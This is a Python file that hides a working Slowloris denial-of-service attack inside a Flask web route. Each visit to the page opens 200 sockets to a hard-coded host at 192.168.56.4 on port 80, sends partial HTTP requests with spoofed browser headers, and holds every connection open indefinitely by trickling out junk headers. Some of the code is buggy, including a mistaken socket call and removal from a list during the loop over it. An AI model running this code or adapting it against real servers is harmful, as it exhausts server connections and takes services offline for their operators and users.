import socket
import random
import time
#import sys

from flask import Flask



app = Flask(__name__)


@app.route('/')
def slowrolis():
    try:
        global allthesockets
        headers = [
            "User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
            "Accept-language: en-US,en,q=0.5",
            "Connection: Keep-Alive"
        ]
        num_sockets = 200
        ip = "192.168.56.4"
        port = 80
        all_sockets = []
        for k in range(num_sockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port))
                all_sockets.append(s)
            except Exception as e:
                print(e)
        print(range(num_sockets)," sockets are ready.")
        num = 0
        for r in all_sockets:
            print("[",num,"]")
            num += 1 
            r.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
            for header in headers:
                r.send(bytes("{}\r\n".format(header).encode("utf-8")))
 
        while True:
            for v in all_sockets:
                try:
                    v.send("X-a: {}\r\n".format(random.randint(1,5000)).encode("utf-8"))
                except:
                    all_sockets.remove(v)
                    try:
                        v.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        v.settimeout(4)
                        v.connect((ip,port))
                        #for each socket:
                        v.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf-8"))
                        for header in headers:
                            v.send(bytes("{}\r\n".format(header).encode("utf-8")))
                    except:
                        pass
 

            time.sleep(10)
            
        
        
    except ConnectionRefusedError:
        slowrolis()
    
 
